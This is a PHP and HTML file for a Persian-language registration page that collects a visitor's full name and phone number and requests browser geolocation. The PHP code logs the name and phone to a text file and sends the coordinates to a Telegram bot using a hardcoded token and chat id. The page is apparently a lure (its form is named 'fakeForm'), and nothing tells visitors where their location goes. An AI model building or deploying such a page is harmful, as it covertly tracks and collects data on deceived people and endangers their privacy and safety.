<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $data = json_decode(file_get_contents("php://input"), true);

    // بررسی اطلاعات دریافتی برای موقعیت مکانی
    if (!isset($data["latitude"]) || !isset($data["longitude"])) {
        echo json_encode(["status" => "error", "message" => "Invalid input"]);
        exit;
    }

    $lat = $data["latitude"];
    $lon = $data["longitude"];

    // ذخیره اطلاعات ثبت‌نامی در فایل txt
    if (isset($data["fullname"]) && isset($data["phone"])) {
        $file = fopen("user_data.txt", "a");
        $txt = "نام و نام خانوادگی: " . $data["fullname"] . "\n";
        $txt .= "شماره همراه: " . $data["phone"] . "\n";
        $txt .= "---------------------------\n";
        fwrite($file, $txt);
        fclose($file);
    }

    // ارسال لوکیشن به تلگرام
    $token = "7926937226:AAFcIfZulEjhnXx7gQpnm712eE1-LvKoT_o";
    $chat_id = "-1002570608346";
    $url = "https://api.telegram.org/bot$token/sendLocation?" . http_build_query([
        "chat_id" => $chat_id,
        "latitude" => $lat,
        "longitude" => $lon
    ]);

    file_get_contents($url);

    echo json_encode(["status" => "ok"]);
    exit;
}
?>

<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>فرم ثبت اطلاعات</title>
  <style>
    body {
      font-family: Tahoma, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .form-container {
      background: white;
      padding: 35px 30px;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      width: 340px;
    }

    .form-container h2 {
      text-align: center;
      margin-bottom: 25px;
      color: #333;
    }

    input[type="text"], input[type="phone"] {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
    }

    button {
      background-color: #28a745;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #218838;
    }

    #status {
      margin-top: 15px;
      text-align: center;
      color: green;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h2>فرم ثبت اطلاعات</h2>
    <form id="fakeForm">
      <input type="text" id="fullname" placeholder="نام کامل" required>
      <input type="text" id="phone" placeholder="شماره همراه" required>
      <button type="submit">ثبت اطلاعات</button>
    </form>
    <div id="status"></div>
  </div>

  <script>
    document.getElementById("fakeForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const statusEl = document.getElementById("status");
      statusEl.innerText = "در حال ثبت...";

      const fullname = document.getElementById("fullname").value;
      const phone = document.getElementById("phone").value;

      if (!navigator.geolocation) {
        statusEl.innerText = "مرورگر موقعیت مکانی را پشتیبانی نمی‌کند.";
        return;
      }

      navigator.geolocation.getCurrentPosition(position => {
        fetch("", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            fullname: fullname,
            phone: phone,
            latitude: position.coords.latitude,
            longitude: position.coords.longitude
          })
        })
        .then(res => res.json())
        .then(data => {
          if (data.status === "ok") {
            statusEl.innerText = "اطلاعات با موفقیت ثبت شد!";
          } else {
            statusEl.innerText = "خطا در ثبت اطلاعات.";
          }
        })
        .catch(() => {
          statusEl.innerText = "خطا در ارتباط با سرور.";
        });
      }, () => {
        statusEl.innerText = "اجازه دسترسی به موقعیت مکانی داده نشد.";
      });
    });
  </script>
</body>
</html>
